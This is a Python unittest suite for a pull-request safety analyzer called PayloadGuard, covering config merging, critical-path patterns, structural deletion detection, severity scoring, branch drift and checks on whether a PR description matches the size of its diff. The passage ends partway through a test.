import json
import os
import re
import sys
import tempfile
import unittest
from datetime import datetime, timezone
from io import StringIO
from unittest.mock import MagicMock, patch

import git

from analyze import (
    CRITICAL_PATH_PATTERNS,
    PayloadAnalyzer,
    PayloadGuardConfig,
    SemanticTransparencyAnalyzer,
    StructuralPayloadAnalyzer,
    TemporalDriftAnalyzer,
    _deep_merge,
    _is_oidc_consumer_typosquatted,
    _load_allowlist,
    _parse_added_packages,
    load_config,
    print_report,
    save_json_report,
)


def _make_analyzer(branch="feature", target="main", config=None):
    with patch("git.Repo"):
        return PayloadAnalyzer("/fake/repo", branch, target, config=config)


SIMPLE_ORIGINAL = """
class Auth:
    def login(self): pass
    def logout(self): pass

class Database:
    def connect(self): pass
    def query(self): pass
    def disconnect(self): pass

class Cache:
    def get(self): pass
    def set(self): pass
"""

SIMPLE_MODIFIED = """
class Auth:
    def login(self): pass
"""


def _make_full_report(status="SAFE", files_deleted=0, lines_deleted=0):
    return {
        "timestamp": datetime.now().isoformat(),
        "analysis": {"branch": "feature", "target": "main", "repo_path": "."},
        "files": {
            "added": 3,
            "deleted": files_deleted,
            "modified": 2,
            "renamed": 0,
            "copied": 0,
            "type_changed": 0,
            "total_changed": 3 + files_deleted + 2,
        },
        "lines": {
            "added": 100,
            "deleted": lines_deleted,
            "net_change": 100 - lines_deleted,
            "deletion_ratio_percent": 0.0,
            "codebase_reduction_percent": 0.0,
        },
        "temporal": {
            "branch_age_days": 5,
            "branch_last_commit": datetime.now().isoformat(),
            "branch_commit_hash": "abc1234",
            "target_last_commit": datetime.now().isoformat(),
            "target_commit_hash": "def5678",
        },
        "verdict": {
            "status": status,
            "severity": "LOW",
            "flags": ["No major red flags detected"],
            "recommendation": "✓ Proceed with normal review process",
            "severity_score": 0,
        },
        "structural": {
            "overall_severity": "LOW",
            "max_deletion_ratio_pct": 0.0,
            "flagged_files": [],
        },
        "temporal_drift": {
            "status": "CURRENT",
            "severity": "LOW",
            "metrics": {
                "branch_age_days": 5,
                "target_velocity": 0.1,
                "calculated_drift_score": 0.5,
                "warning_threshold": 250.0,
                "critical_threshold": 1000.0,
            },
            "recommendation": "✓ SAFE. Branch context is synchronized with target.",
        },
        "semantic": {
            "status": "TRANSPARENT",
            "is_deceptive": False,
            "matched_keyword": None,
            "directive": "✓ SAFE. PR description aligns with verified structural impact.",
        },
        "content_flags": [],
        "deleted_files": {"total": files_deleted, "critical": [], "all": []},
    }


# ==============================================================================
# CONFIGURATION
# ==============================================================================

class TestDeepMerge(unittest.TestCase):
    def test_shallow_override(self):
        result = _deep_merge({"a": 1, "b": 2}, {"b": 99})
        self.assertEqual(result, {"a": 1, "b": 99})

    def test_nested_merge_preserves_unspecified_keys(self):
        base = {"x": {"a": 1, "b": 2}}
        result = _deep_merge(base, {"x": {"b": 99}})
        self.assertEqual(result["x"]["a"], 1)
        self.assertEqual(result["x"]["b"], 99)

    def test_does_not_mutate_base(self):
        base = {"x": {"a": 1}}
        _deep_merge(base, {"x": {"a": 99}})
        self.assertEqual(base["x"]["a"], 1)

    def test_new_key_in_override_is_added(self):
        result = _deep_merge({"a": 1}, {"b": 2})
        self.assertEqual(result["b"], 2)


class TestPayloadGuardConfig(unittest.TestCase):
    def test_default_thresholds(self):
        cfg = PayloadGuardConfig()
        self.assertEqual(cfg.thresholds["branch_age_days"], [90, 180, 365])
        self.assertEqual(cfg.thresholds["structural"]["deletion_ratio"], 0.20)
        self.assertEqual(cfg.thresholds["structural"]["min_deleted_nodes"], 3)

    def test_default_instances_are_independent(self):
        cfg1 = PayloadGuardConfig()
        cfg2 = PayloadGuardConfig()
        cfg1.thresholds["branch_age_days"][0] = 999
        self.assertEqual(cfg2.thresholds["branch_age_days"][0], 90)

    def test_semantic_config_has_v2_keys(self):
        cfg = PayloadGuardConfig()
        self.assertIn("micro_scope_churn_limit", cfg.semantic)
        self.assertIn("insertion_ratio_fix_threshold", cfg.semantic)
        self.assertIn("benign_keywords", cfg.semantic)  # legacy key preserved


class TestLoadConfig(unittest.TestCase):
    def test_returns_defaults_when_no_file(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = load_config(d)
        self.assertEqual(cfg.thresholds["branch_age_days"], [90, 180, 365])
        self.assertEqual(cfg.thresholds["temporal"]["stale"], 250.0)

    def test_deep_merges_partial_structural_override(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "payloadguard.yml"), "w") as f:
                f.write("thresholds:\n  structural:\n    deletion_ratio: 0.10\n")
            cfg = load_config(d)
        self.assertEqual(cfg.thresholds["structural"]["deletion_ratio"], 0.10)
        self.assertEqual(cfg.thresholds["structural"]["min_deleted_nodes"], 3)

    def test_deep_merges_partial_temporal_override(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "payloadguard.yml"), "w") as f:
                f.write("thresholds:\n  temporal:\n    stale: 100\n")
            cfg = load_config(d)
        self.assertEqual(cfg.thresholds["temporal"]["stale"], 100)
        self.assertEqual(cfg.thresholds["temporal"]["dangerous"], 1000.0)

    def test_custom_benign_keywords_replace_defaults(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "payloadguard.yml"), "w") as f:
                f.write("semantic:\n  benign_keywords:\n    - trivial\n    - nit\n")
            cfg = load_config(d)
        self.assertEqual(cfg.semantic["benign_keywords"], ["trivial", "nit"])

    def test_empty_yaml_returns_defaults(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "payloadguard.yml"), "w") as f:
                f.write("")
            cfg = load_config(d)
        self.assertEqual(cfg.thresholds["branch_age_days"], [90, 180, 365])


# ==============================================================================
# CRITICAL PATH PATTERNS (Layer 2)
# ==============================================================================

class TestCriticalPathPatterns(unittest.TestCase):
    def _matches(self, path):
        return any(re.search(p, path) for p in CRITICAL_PATH_PATTERNS)

    def test_tests_directory_is_critical(self):
        self.assertTrue(self._matches("tests/test_core.py"))

    def test_test_directory_singular_is_critical(self):
        self.assertTrue(self._matches("test/unit/auth.py"))

    def test_test_file_prefix_is_critical(self):
        self.assertTrue(self._matches("src/test_auth.py"))

    def test_github_workflows_is_critical(self):
        self.assertTrue(self._matches(".github/workflows/ci.yml"))

    def test_requirements_txt_is_critical(self):
        self.assertTrue(self._matches("requirements.txt"))

    def test_requirements_dev_txt_is_critical(self):
        self.assertTrue(self._matches("requirements-dev.txt"))

    def test_setup_py_is_critical(self):
        self.assertTrue(self._matches("setup.py"))

    def test_yaml_file_is_critical(self):
        self.assertTrue(self._matches("deploy/config.yaml"))

    def test_protest_py_is_not_critical(self):
        self.assertFalse(self._matches("src/protest.py"))

    def test_latest_deployment_is_not_critical(self):
        self.assertFalse(self._matches("logs/latest_deployment.py"))

    def test_reconfiguration_log_is_not_critical(self):
        self.assertFalse(self._matches("logs/reconfiguration_log.py"))
        

# ==============================================================================
# LAYER 4 — StructuralPayloadAnalyzer
# ==============================================================================

class TestStructuralPayloadAnalyzer(unittest.TestCase):
    def test_no_deletions_status_is_safe(self):
        result = StructuralPayloadAnalyzer(SIMPLE_ORIGINAL, SIMPLE_ORIGINAL, file_path="test.py").analyze_structural_drift()
        self.assertEqual(result["status"], "SAFE")
        self.assertEqual(result["metrics"]["deleted_node_count"], 0)

    def test_detects_deleted_classes(self):
        result = StructuralPayloadAnalyzer(SIMPLE_ORIGINAL, SIMPLE_MODIFIED, file_path="test.py").analyze_structural_drift()
        self.assertIn("Database", result["deleted_components"])
        self.assertIn("Cache", result["deleted_components"])

    def test_full_delete_has_higher_deletion_ratio_than_partial(self):
        full = StructuralPayloadAnalyzer(SIMPLE_ORIGINAL, "", file_path="test.py").analyze_structural_drift()
        partial = StructuralPayloadAnalyzer(SIMPLE_ORIGINAL, SIMPLE_MODIFIED, file_path="test.py").analyze_structural_drift()
        self.assertGreater(
            full["metrics"]["structural_deletion_ratio"],
            partial["metrics"]["structural_deletion_ratio"],
        )

    def test_below_min_deletion_count_not_flagged(self):
        tiny_original = "def foo(): pass\ndef bar(): pass"
        tiny_modified = "def foo(): pass"
        result = StructuralPayloadAnalyzer(tiny_original, tiny_modified, file_path="test.py").analyze_structural_drift()
        self.assertEqual(result["status"], "SAFE")

    def test_both_thresholds_met_is_destructive(self):
        result = StructuralPayloadAnalyzer(SIMPLE_ORIGINAL, "", file_path="test.py").analyze_structural_drift()
        self.assertEqual(result["status"], "DESTRUCTIVE")
        self.assertEqual(result["severity"], "CRITICAL")

    def test_syntax_error_returns_error_key(self):
        result = StructuralPayloadAnalyzer("def foo(: pass", "valid = 1", file_path="test.py").analyze_structural_drift()
        self.assertIn("error", result)

    def test_added_components_tracked(self):
        result = StructuralPayloadAnalyzer(SIMPLE_MODIFIED, SIMPLE_ORIGINAL, file_path="test.py").analyze_structural_drift()
        self.assertIn("Database", result["added_components"])

    def test_empty_original_no_crash(self):
        result = StructuralPayloadAnalyzer("", SIMPLE_ORIGINAL, file_path="test.py").analyze_structural_drift()
        self.assertEqual(result["metrics"]["deleted_node_count"], 0)
        self.assertEqual(result["status"], "SAFE")

    def test_deletion_ratio_reported_in_metrics(self):
        result = StructuralPayloadAnalyzer(SIMPLE_ORIGINAL, "", file_path="test.py").analyze_structural_drift()
        self.assertIn("structural_deletion_ratio", result["metrics"])
        self.assertEqual(result["metrics"]["structural_deletion_ratio"], 100.0)

    def test_high_custom_threshold_suppresses_flag(self):
        result = StructuralPayloadAnalyzer(
            SIMPLE_ORIGINAL, "", file_path="test.py", deletion_ratio_threshold=1.5
        ).analyze_structural_drift()
        self.assertEqual(result["status"], "SAFE")


# ==============================================================================
# LAYER 3 — _assess_consequence (severity model)
# ==============================================================================

class TestAssessConsequenceSafe(unittest.TestCase):
    def setUp(self):
        self.a = _make_analyzer()

    def test_no_changes_is_safe(self):
        v = self.a._assess_consequence(0, 0, 0, 0)
        self.assertEqual(v["status"], "SAFE")
        self.assertEqual(v["severity_score"], 0)

    def test_safe_has_recommendation(self):
        v = self.a._assess_consequence(0, 0, 0, 0)
        self.assertIn("recommendation", v)
        self.assertIn("flags", v)


class TestAssessConsequenceReview(unittest.TestCase):
    def setUp(self):
        self.a = _make_analyzer()

    def test_branch_over_90_days(self):
        v = self.a._assess_consequence(0, 0, 91, 0)
        self.assertEqual(v["status"], "REVIEW")
        self.assertEqual(v["severity_score"], 1)

    def test_11_files_deleted(self):
        v = self.a._assess_consequence(11, 0, 0, 0)
        self.assertEqual(v["status"], "REVIEW")

    def test_deletion_ratio_over_50(self):
        v = self.a._assess_consequence(0, 200, 0, 55)
        self.assertEqual(v["status"], "REVIEW")

    def test_5001_lines_deleted(self):
        v = self.a._assess_consequence(0, 5001, 0, 0)
        self.assertEqual(v["status"], "REVIEW")


class TestAssessConsequenceCaution(unittest.TestCase):
    def setUp(self):
        self.a = _make_analyzer()

    def test_branch_over_180_days_plus_minor_flag(self):
        v = self.a._assess_consequence(11, 0, 185, 0)
        self.assertEqual(v["status"], "CAUTION")
        self.assertGreaterEqual(v["severity_score"], 3)

    def test_over_20_files_plus_old_branch(self):
        v = self.a._assess_consequence(25, 0, 91, 0)
        self.assertEqual(v["status"], "CAUTION")

    def test_deletion_ratio_over_70_plus_minor_flag(self):
        v = self.a._assess_consequence(11, 200, 0, 75)
        self.assertEqual(v["status"], "CAUTION")

    def test_over_10000_lines_plus_old_branch(self):
        v = self.a._assess_consequence(0, 10001, 91, 0)
        self.assertEqual(v["status"], "CAUTION")


class TestAssessConsequenceDestructive(unittest.TestCase):
    def setUp(self):
        self.a = _make_analyzer()

    def test_branch_over_365_days_and_many_files(self):
        v = self.a._assess_consequence(60, 0, 400, 0)
        self.assertEqual(v["status"], "DESTRUCTIVE")
        self.assertEqual(v["severity"], "CRITICAL")

    def test_high_deletion_ratio_and_line_count(self):
        v = self.a._assess_consequence(0, 15000, 10, 95)
        self.assertEqual(v["status"], "CAUTION")

    def test_combined_flags_score(self):
        v = self.a._assess_consequence(60, 60000, 400, 95)
        self.assertGreaterEqual(v["severity_score"], 5)
        self.assertGreater(len(v["flags"]), 1)

    def test_recommendation_says_do_not_merge(self):
        v = self.a._assess_consequence(60, 60000, 400, 95)
        self.assertIn("DO NOT MERGE", v["recommendation"])


class TestAssessConsequenceStructural(unittest.TestCase):
    def setUp(self):
        self.a = _make_analyzer()

    def test_low_structural_severity_no_flag(self):
        v = self.a._assess_consequence(0, 0, 0, 0, structural_severity="LOW")
        self.assertNotIn("Structural drift", " ".join(v["flags"]))

    def test_critical_structural_severity_adds_flag(self):
        v = self.a._assess_consequence(0, 0, 0, 0, structural_severity="CRITICAL")
        self.assertIn("Structural drift", " ".join(v["flags"]))

    def test_critical_structural_severity_elevates_verdict(self):
        v = self.a._assess_consequence(0, 0, 0, 0, structural_severity="CRITICAL")
        self.assertIn(v["status"], ("CAUTION", "DESTRUCTIVE"))

    def test_critical_structural_severity_increases_score(self):
        v_low = self.a._assess_consequence(0, 0, 0, 0, structural_severity="LOW")
        v_critical = self.a._assess_consequence(0, 0, 0, 0, structural_severity="CRITICAL")
        self.assertGreater(v_critical["severity_score"], v_low["severity_score"])

    def test_default_structural_severity_is_safe(self):
        v = self.a._assess_consequence(0, 0, 0, 0)
        self.assertEqual(v["status"], "SAFE")


class TestAssessConsequenceCustomThresholds(unittest.TestCase):
    def test_custom_age_threshold_fires_earlier(self):
        from analyze import PayloadGuardConfig
        cfg = PayloadGuardConfig()
        cfg.thresholds["branch_age_days"] = [30, 60, 90]
        a = _make_analyzer(config=cfg)
        v = a._assess_consequence(0, 0, 35, 0)
        self.assertEqual(v["status"], "REVIEW")

    def test_custom_files_threshold(self):
        from analyze import PayloadGuardConfig
        cfg = PayloadGuardConfig()
        cfg.thresholds["files_deleted"] = [3, 5, 10]
        a = _make_analyzer(config=cfg)
        v = a._assess_consequence(4, 0, 0, 0)
        self.assertEqual(v["status"], "REVIEW")


# ==============================================================================
# PayloadAnalyzer — init & errors
# ==============================================================================

class TestPayloadAnalyzerInit(unittest.TestCase):
    def test_bad_repo_path_exits(self):
        with self.assertRaises(SystemExit):
            PayloadAnalyzer("/this/does/not/exist", "branch", "main")

    def test_stores_branch_and_target(self):
        with patch("git.Repo"):
            a = PayloadAnalyzer("/fake", "my-branch", "develop")
        self.assertEqual(a.branch, "my-branch")
        self.assertEqual(a.target, "develop")

    def test_default_target_is_main(self):
        with patch("git.Repo"):
            a = PayloadAnalyzer("/fake", "feature")
        self.assertEqual(a.target, "main")

    def test_uses_default_config_when_none_passed(self):
        with patch("git.Repo"):
            a = PayloadAnalyzer("/fake", "feature")
        self.assertEqual(a.config.thresholds["branch_age_days"], [90, 180, 365])

    def test_accepts_custom_config(self):
        cfg = PayloadGuardConfig()
        cfg.thresholds["branch_age_days"] = [10, 20, 30]
        with patch("git.Repo"):
            a = PayloadAnalyzer("/fake", "feature", config=cfg)
        self.assertEqual(a.config.thresholds["branch_age_days"], [10, 20, 30])


class TestAnalyzeErrors(unittest.TestCase):
    def setUp(self):
        self.a = _make_analyzer()

    def test_missing_target_branch_returns_error(self):
        self.a.repo.commit.side_effect = git.exc.BadName("main")
        result = self.a.analyze()
        self.assertIn("error", result)
        self.assertIn("main", result["error"])

    def test_missing_feature_branch_returns_error(self):
        call_count = {"n": 0}

        def commit_side_effect(branch):
            call_count["n"] += 1
            if call_count["n"] == 2:
                raise git.exc.BadName(branch)
            return MagicMock()

        self.a.repo.commit.side_effect = commit_side_effect
        result = self.a.analyze()
        self.assertIn("error", result)

    def test_error_includes_available_branches(self):
        self.a.repo.commit.side_effect = git.exc.BadName("main")
        self.a.repo.heads = []
        result = self.a.analyze()
        self.assertIn("available_branches", result)

    def test_empty_merge_base_returns_error(self):
        self.a.repo.commit.side_effect = None
        self.a.repo.commit.return_value = MagicMock()
        self.a.repo.merge_base.return_value = []
        result = self.a.analyze()
        self.assertIn("error", result)
        self.assertIn("common ancestor", result["error"])


# ==============================================================================
# PayloadAnalyzer — successful analysis
# ==============================================================================

class TestAnalyzeSuccess(unittest.TestCase):
    def _build_mock_diff(self, change_type, content=None):
        d = MagicMock()
        d.change_type = change_type
        if change_type == "A":
            d.b_blob.data_stream.read.return_value = (content or "line1\nline2\n").encode()
        elif change_type == "D":
            d.a_blob.data_stream.read.return_value = (content or "line1\nline2\n").encode()
            d.a_path = "src/deleted_file.py"
        return d

    def _setup_repo(self, diffs):
        a = _make_analyzer()
        t1 = datetime(2025, 1, 1, tzinfo=timezone.utc)
        t2 = datetime(2025, 3, 1, tzinfo=timezone.utc)

        branch_commit = MagicMock()
        branch_commit.committed_datetime = t1
        branch_commit.hexsha = "aabbccddeeff"

        target_commit = MagicMock()
        target_commit.committed_datetime = t2
        target_commit.hexsha = "112233445566"

        def commit_side_effect(ref):
            if ref == "main":
                return target_commit
            return branch_commit

        a.repo.commit.side_effect = commit_side_effect
        a.repo.iter_commits.return_value = []

        merge_base_commit = MagicMock()
        merge_base_commit.diff.return_value = diffs
        merge_base_commit.hexsha = "deadbeef00000000"
        a.repo.merge_base.return_value = [merge_base_commit]

        numstat_lines = []
        for d in diffs:
            added, deleted = 0, 0
            path = getattr(d, 'b_path', None) or getattr(d, 'a_path', None) or 'file.py'
            if d.change_type == 'A':
                try:
                    content = d.b_blob.data_stream.read().decode('utf-8', errors='ignore')
                    added = len(content.splitlines())
                except Exception:
                    pass
            elif d.change_type == 'D':
                try:
                    content = d.a_blob.data_stream.read().decode('utf-8', errors='ignore')
                    deleted = len(content.splitlines())
                except Exception:
                    pass
            numstat_lines.append(f"{added}\t{deleted}\t{path}")
        a.repo.git.diff.return_value = "\n".join(numstat_lines)

        return a

    def test_report_has_required_keys(self):
        a = self._setup_repo([self._build_mock_diff("M")])
        result = a.analyze()
        self.assertNotIn("error", result)
        for key in (
            "timestamp", "analysis", "files", "lines", "temporal",
            "verdict", "deleted_files", "structural", "temporal_drift", "semantic",
            "content_flags",
        ):
            self.assertIn(key, result)

    def test_counts_modified_files(self):
        diffs = [self._build_mock_diff("M"), self._build_mock_diff("M")]
        a = self._setup_repo(diffs)
        result = a.analyze()
        self.assertEqual(result["files"]["modified"], 2)

    def test_counts_deleted_files(self):
        diffs = [self._build_mock_diff("D"), self._build_mock_diff("D")]
        a = self._setup_repo(diffs)
        result = a.analyze()
        self.assertEqual(result["files"]["deleted"], 2)

    def test_counts_added_lines(self):
        a = self._setup_repo([self._build_mock_diff("A", "a\nb\nc\n")])
        result = a.analyze()
        self.assertGreater(result["lines"]["added"], 0)

    def test_counts_deleted_lines(self):
        a = self._setup_repo([self._build_mock_diff("D", "x\ny\n")])
        result = a.analyze()
        self.assertGreater(result["lines"]["deleted"], 0)

    def test_verdict_is_present(self):
        a = self._setup_repo([self._build_mock_diff("M")])
        result = a.analyze()
        self.assertIn(result["verdict"]["status"], ("SAFE", "REVIEW", "CAUTION", "DESTRUCTIVE"))

    def test_critical_deletions_flagged(self):
        d = self._build_mock_diff("D")
        d.a_path = "tests/test_core.py"
        a = self._setup_repo([d])
        result = a.analyze()
        self.assertIn("tests/test_core.py", result["deleted_files"]["critical"])

    def test_deleted_files_list(self):
        d = self._build_mock_diff("D")
        d.a_path = "src/module.py"
        a = self._setup_repo([d])
        result = a.analyze()
        self.assertIn("src/module.py", result["deleted_files"]["all"])

    def test_deletion_ratio_zero_when_no_changes(self):
        a = self._setup_repo([self._build_mock_diff("M")])
        result = a.analyze()
        self.assertEqual(result["lines"]["deletion_ratio_percent"], 0.0)

    def test_structural_report_has_correct_shape(self):
        a = self._setup_repo([self._build_mock_diff("M")])
        result = a.analyze()
        s = result["structural"]
        self.assertIn("overall_severity", s)
        self.assertIn("max_deletion_ratio_pct", s)
        self.assertIn("flagged_files", s)

    def test_pr_description_flows_to_semantic_result(self):
        a = self._setup_repo([self._build_mock_diff("M")])
        result = a.analyze(pr_description="minor syntax fix")
        self.assertIn("semantic", result)
        self.assertIn("status", result["semantic"])

    def test_commit_flags_key_present(self):
        a = self._setup_repo([self._build_mock_diff("M")])
        result = a.analyze()
        self.assertIn("commit_flags", result)
        self.assertIsInstance(result["commit_flags"], list)

    def test_red_flag_commit_message_detected(self):
        a = self._setup_repo([self._build_mock_diff("M")])
        suspicious = MagicMock()
        suspicious.hexsha = "abcdef1234567"
        suspicious.message = "remove all tests to simplify CI"
        a.repo.iter_commits.side_effect = lambda *args, **kwargs: [suspicious]
        result = a.analyze()
        self.assertEqual(len(result["commit_flags"]), 1)
        self.assertEqual(result["commit_flags"][0]["sha"], "abcdef1")

    def test_permission_changes_detected(self):
        d = self._build_mock_diff("M")
        d.a_mode = 0o100644
        d.b_mode = 0o100755
        d.b_path = "deploy.sh"
        a = self._setup_repo([d])
        result = a.analyze()
        self.assertIn("permission_changes", result)
        exe = [p for p in result["permission_changes"] if p.get("made_executable")]
        self.assertEqual(len(exe), 1)
        self.assertEqual(exe[0]["file"], "deploy.sh")


        # ==============================================================================
# LAYER 5a — TemporalDriftAnalyzer
# ==============================================================================

class TestTemporalDriftAnalyzer(unittest.TestCase):
    def test_zero_drift_is_current(self):
        result = TemporalDriftAnalyzer(0, 0.0).analyze_drift()
        self.assertEqual(result["status"], "CURRENT")
        self.assertEqual(result["severity"], "LOW")

    def test_below_warning_threshold_is_current(self):
        result = TemporalDriftAnalyzer(10, 5.0).analyze_drift()
        self.assertEqual(result["status"], "CURRENT")

    def test_at_warning_threshold_is_stale(self):
        result = TemporalDriftAnalyzer(50, 5.0).analyze_drift()
        self.assertEqual(result["status"], "STALE")
        self.assertEqual(result["severity"], "WARNING")

    def test_above_critical_threshold_is_dangerous(self):
        result = TemporalDriftAnalyzer(100, 10.1).analyze_drift()
        self.assertEqual(result["status"], "DANGEROUS")
        self.assertEqual(result["severity"], "CRITICAL")

    def test_negative_age_raises(self):
        with self.assertRaises(ValueError):
            TemporalDriftAnalyzer(-1, 5.0).analyze_drift()

    def test_negative_velocity_raises(self):
        with self.assertRaises(ValueError):
            TemporalDriftAnalyzer(10, -1.0).analyze_drift()

    def test_drift_score_calculated_correctly(self):
        result = TemporalDriftAnalyzer(30, 4.0).analyze_drift()
        self.assertAlmostEqual(result["metrics"]["calculated_drift_score"], 120.0)

    def test_custom_thresholds(self):
        result = TemporalDriftAnalyzer(
            10, 5.0, warning_threshold=50.0, critical_threshold=200.0
        ).analyze_drift()
        self.assertEqual(result["status"], "STALE")

    def test_recommendation_present(self):
        result = TemporalDriftAnalyzer(0, 0.0).analyze_drift()
        self.assertIn("recommendation", result)

    def test_metrics_block_present(self):
        result = TemporalDriftAnalyzer(5, 2.0).analyze_drift()
        for key in ("branch_age_days", "target_velocity", "calculated_drift_score",
                    "warning_threshold", "critical_threshold"):
            self.assertIn(key, result["metrics"])


# ==============================================================================
# LAYER 5b — SemanticTransparencyAnalyzer
# ==============================================================================

def _make_sem_diff(diff_text="", path="service.py", change_type="M"):
    """Build a minimal mock diff object for SemanticTransparencyAnalyzer tests."""
    d = MagicMock()
    d.b_path = path
    d.a_path = path
    d.change_type = change_type
    d.diff = diff_text.encode() if isinstance(diff_text, str) else diff_text
    return d


class TestSemanticTransparencyAnalyzer(unittest.TestCase):
    """v2 API tests — keeps original test names where intent is preserved."""

    def test_empty_description_is_unverified(self):
        result = SemanticTransparencyAnalyzer("", diffs=[]).analyze_transparency()
        self.assertEqual(result["status"], "UNVERIFIED")
        self.assertFalse(result["is_deceptive"])

    def test_whitespace_description_is_unverified(self):
        result = SemanticTransparencyAnalyzer("   ", diffs=[]).analyze_transparency()
        self.assertEqual(result["status"], "UNVERIFIED")

    def test_micro_scope_large_churn_is_caution(self):
        # "minor syntax fix" + 200 changed lines → V_s fires (0.4) → CAUTION_MISMATCH
        lines = "\n".join([f"-old line {i}" for i in range(100)] +
                          [f"+new line {i}" for i in range(100)])
        d = _make_sem_diff(lines)
        result = SemanticTransparencyAnalyzer("minor syntax fix", diffs=[d]).analyze_transparency()
        self.assertIn(result["status"], ("CAUTION_MISMATCH", "DECEPTIVE_PAYLOAD"))
        self.assertIn("scope_understated", result["signals"])

    def test_micro_scope_large_churn_and_new_function_is_deceptive(self):
        # V_s (0.4) + V_o (0.3) = 0.7 → DECEPTIVE_PAYLOAD
        lines = (
            "\n".join([f"-old line {i}" for i in range(100)]) + "\n"
            + "+def new_backdoor():\n"
            + "\n".join([f"+new line {i}" for i in range(100)])
        )
        d = _make_sem_diff(lines)
        result = SemanticTransparencyAnalyzer("minor syntax fix", diffs=[d]).analyze_transparency()
        self.assertTrue(result["is_deceptive"])
        self.assertEqual(result["status"], "DECEPTIVE_PAYLOAD")

    def test_micro_scope_small_churn_is_transparent(self):
        # "minor fix" + 3 changed lines → no signals → TRANSPARENT
        lines = "-old\n+new\n-x\n+y"
        d = _make_sem_diff(lines)
        result = SemanticTransparencyAnalyzer("minor syntax fix", diffs=[d]).analyze_transparency()
        self.assertFalse(result["is_deceptive"])
        self.assertEqual(result["status"], "TRANSPARENT")

    def test_macro_scope_gives_caution_mismatch(self):
        # "major refactor" → macro_scope_manual_review signal → CAUTION_MISMATCH
        result = SemanticTransparencyAnalyzer("major refactor of entire system", diffs=[]).analyze_transparency()
        self.assertEqual(result["status"], "CAUTION_MISMATCH")
        self.assertFalse(result["is_deceptive"])
        self.assertIn("macro_scope_manual_review", result["signals"])

    def test_unspecified_scope_large_diff_is_transparent(self):
        # No scope keywords → no V_s trigger even with large diff
        lines = "\n".join([f"-line {i}" for i in range(100)] + [f"+line {i}" for i in range(100)])
        d = _make_sem_diff(lines)
        result = SemanticTransparencyAnalyzer("update authentication handler", diffs=[d]).analyze_transparency()
        self.assertEqual(result["status"], "TRANSPARENT")

    def test_directive_present(self):
        result = SemanticTransparencyAnalyzer("minor fix", diffs=[]).analyze_transparency()
        self.assertIn("directive", result)

    def test_matched_keyword_is_first_signal_or_none(self):
        # With signals: matched_keyword == signals[0]
        lines = "\n".join([f"-old {i}" for i in range(100)] + [f"+new {i}" for i in range(100)])
        d = _make_sem_diff(lines)
        result = SemanticTransparencyAnalyzer("minor typo", diffs=[d]).analyze_transparency()
        self.assertEqual(result["matched_keyword"], result["signals"][0])

    def test_matched_keyword_none_when_transparent(self):
        result = SemanticTransparencyAnalyzer("update login flow", diffs=[]).analyze_transparency()
        self.assertIsNone(result["matched_keyword"])

    def test_is_deceptive_false_on_caution_mismatch(self):
        result = SemanticTransparencyAnalyzer("major overhaul", diffs=[]).analyze_transparency()
        self.assertFalse(result["is_deceptive"])

    def test_mci_score_present(self):
        result = SemanticTransparencyAnalyzer("minor fix", diffs=[]).analyze_transparency()
        self.assertIn("mci_score", result)
        self.assertIsInstance(result["mci_score"], float)

    def test_signals_list_present(self):
        result = SemanticTransparencyAnalyzer("update auth layer", diffs=[]).analyze_transparency()
        self.assertIn("signals", result)
        self.assertIsInstance(result["signals"], list)


# ==============================================================================
# print_report
# ==============================================================================

class TestPrintReport(unittest.TestCase):
    def test_error_report_prints_failed(self):
        report = {"error": "Branch not found", "error_type": "BadName"}
        with patch("sys.stdout", new_callable=StringIO) as out:
            print_report(report)
        self.assertIn("ANALYSIS FAILED", out.getvalue())
        self.assertIn("Branch not found", out.getvalue())

    def test_error_with_available_branches(self):
        report = {"error": "Not found", "available_branches": ["main", "dev"]}
        with patch("sys.stdout", new_callable=StringIO) as out:
            print_report(report)
        self.assertIn("main", out.getvalue())

    def test_full_report_shows_branch_names(self):
        with patch("sys.stdout", new_callable=StringIO) as out:
            print_report(_make_full_report())
        output = out.getvalue()
        self.assertIn("feature", output)
        self.assertIn("main", output)

    def test_full_report_shows_verdict(self):
        with patch("sys.stdout", new_callable=StringIO) as out:
            print_report(_make_full_report(status="DESTRUCTIVE"))
        self.assertIn("DESTRUCTIVE", out.getvalue())

    def test_deleted_files_section_shown_when_present(self):
        report = _make_full_report(files_deleted=2)
        report["deleted_files"]["all"] = ["src/a.py", "src/b.py"]
        report["deleted_files"]["critical"] = ["src/a.py"]
        with patch("sys.stdout", new_callable=StringIO) as out:
            print_report(report)
        self.assertIn("src/a.py", out.getvalue())

    def test_no_deleted_files_section_when_empty(self):
        with patch("sys.stdout", new_callable=StringIO) as out:
            print_report(_make_full_report(files_deleted=0))
        self.assertNotIn("DELETED FILES", out.getvalue())


# ==============================================================================
# save_json_report
# ==============================================================================

class TestSaveJsonReport(unittest.TestCase):
    def test_saves_valid_json(self):
        report = {"status": "SAFE", "score": 0}
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            path = f.name
        try:
            save_json_report(report, path)
            with open(path) as f:
                loaded = json.load(f)
            self.assertEqual(loaded["status"], "SAFE")
        finally:
            os.unlink(path)

    def test_gracefully_handles_write_error(self):
        with patch("builtins.open", side_effect=PermissionError("denied")):
            save_json_report({"x": 1}, "/bad/path.json")


# ==============================================================================
# Module-level constants tracked in structural parser (§1.6)
# ==============================================================================

class TestStructuralParserConstants(unittest.TestCase):
    def setUp(self):
        from structural_parser import extract_named_nodes
        self.extract = extract_named_nodes

    def test_module_level_assignment_tracked(self):
        src = "MAX_RETRIES = 5\nTIMEOUT = 30\n"
        names = self.extract(src, "module.py")
        self.assertIn("MAX_RETRIES", names)
        self.assertIn("TIMEOUT", names)

    def test_annotated_assignment_tracked(self):
        src = "SECRET_KEY: str = 'abc'\n"
        names = self.extract(src, "config.py")
        self.assertIn("SECRET_KEY", names)

    def test_functions_still_tracked(self):
        src = "def foo(): pass\nclass Bar: pass\n"
        names = self.extract(src, "mod.py")
        self.assertIn("foo", names)
        self.assertIn("Bar", names)

    def test_local_variable_not_tracked(self):
        src = "def foo():\n    x = 1\n    return x\n"
        names = self.extract(src, "mod.py")
        self.assertNotIn("x", names)
        self.assertIn("foo", names)

    def test_deletion_of_constant_detected_by_structural_analyzer(self):
        original = "SECRET = 'key'\n\ndef process(): pass\n"
        modified = "def process(): pass\n"
